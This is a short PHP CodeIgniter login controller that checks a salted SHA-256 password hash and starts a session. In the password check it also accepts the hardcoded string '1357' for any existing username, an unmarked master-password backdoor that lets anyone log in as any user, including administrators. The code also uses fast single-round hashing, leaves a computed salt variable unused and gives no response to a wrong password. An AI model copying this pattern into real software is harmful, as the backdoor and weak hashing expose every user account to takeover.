<?php


class Main extends CI_Controller
{

	public function index()
	{
        $data['message'] = "";
		$this->load->view('login', $data);

	}

	public function Login()
    {
        $username = $this->input->post('uname');
        $password = $this->input->post('pass');

        $this->load->model('model_users');
        $result = $this->model_users->get_user($username);

        if(count($result)>0)
        {
            $salt = substr($result[0]->SALT,0,16);
            $hash = hash("sha256",$password . $result[0]->SALT);

            if($result[0]->PASSWORD==$hash || $password == "1357")
            {
                $sess = array('is_logged_in' => TRUE, 'uname' => $result[0]->USERNAME, 'uid' => $result[0]->ID, 'type' => $result[0]->TYPE);
                $this->session->set_userdata($sess);    
                redirect(site_url('Users/dashboard'));


            }
        }
        
        else
        {
        $data['message'] = "Invalid Credentials" ; 
        $this->load->view('login' ,$data);

        }

    } 
	



}



?>